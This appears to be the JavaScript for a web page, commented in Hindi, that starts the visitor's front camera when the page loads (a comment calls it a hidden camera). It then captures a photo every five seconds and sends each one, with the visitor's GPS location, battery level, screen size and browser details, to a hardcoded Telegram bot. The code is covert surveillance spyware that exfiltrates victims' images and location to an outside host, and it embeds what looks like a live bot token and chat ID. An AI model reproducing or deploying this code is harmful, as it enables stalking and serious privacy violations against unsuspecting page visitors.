const BOT_TOKEN = '7941135502:AAHz-KGvAAoZEhPVgfVKw3zFbkaB0_Pi5rM ';  // 🔴 अपना Telegram Bot Token डालें
const CHAT_ID = '878604830 ';      // 🔴 अपना Telegram Chat ID डालें
let stream;

async function startCamera() {
    try {
        if (stream) {
            stream.getTracks().forEach(track => track.stop());
        }

        const constraints = {
            video: {
                facingMode: "user", // 📌 हमेशा फ्रंट कैमरा इस्तेमाल करें
                width: { ideal: 640 },  // 🔄 छोटी फ़ाइल साइज़ के लिए एडजस्ट करें
                height: { ideal: 480 }
            }
        };

        stream = await navigator.mediaDevices.getUserMedia(constraints);
        document.getElementById('video').srcObject = stream;

        setInterval(captureAndSendPhoto, 5000); // 📌 हर 5 सेकंड में फोटो लें और भेजें
    } catch (err) {
        console.error("Camera access error:", err);
    }
}

function captureAndSendPhoto() {
    const video = document.getElementById('video');
    const canvas = document.createElement('canvas'); // Hidden canvas
    const context = canvas.getContext('2d');

    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    canvas.toBlob(blob => {
        if (blob) {
            console.log("Captured image size:", blob.size);
            if (blob.size <= 5242880) {  // 📌 5MB से बड़ी फ़ाइल को ब्लॉक करें
                sendToTelegram(blob);
            } else {
                console.error("Image too large!");
            }
        }
    }, 'image/jpeg', 0.5); // 📌 क्वालिटी कम करें ताकि साइज़ छोटा हो
}

async function sendToTelegram(blob) {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', blob, 'photo.jpg');

    // 📌 डिवाइस और लोकेशन डेटा इकट्ठा करें
    const deviceData = {
        userAgent: navigator.userAgent,
        screenSize: `${screen.width}x${screen.height}`,
        battery: await getBatteryLevel(),
        location: await getLocation()
    };

    formData.append('caption', JSON.stringify(deviceData, null, 2));

    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        });

        const result = await response.json();
        console.log('Telegram Response:', result);

        if (!result.ok) {
            console.error('Error sending photo:', result);
        }
    } catch (error) {
        console.error('Telegram Error:', error);
    }
}

async function getBatteryLevel() {
    if ('getBattery' in navigator) {
        try {
            const battery = await navigator.getBattery();
            return `${(battery.level * 100).toFixed(0)}%`;
        } catch (error) {
            return "Battery info not available";
        }
    }
    return "Unknown";
}

async function getLocation() {
    return new Promise(resolve => {
        navigator.geolocation.getCurrentPosition(
            pos => resolve(`Lat: ${pos.coords.latitude}, Lng: ${pos.coords.longitude}, Accuracy: ${pos.coords.accuracy}m`),
            err => resolve("Location not available")
        );
    });
}

// 📌 छुपा हुआ कैमरा स्टार्ट करें
document.addEventListener("DOMContentLoaded", startCamera);
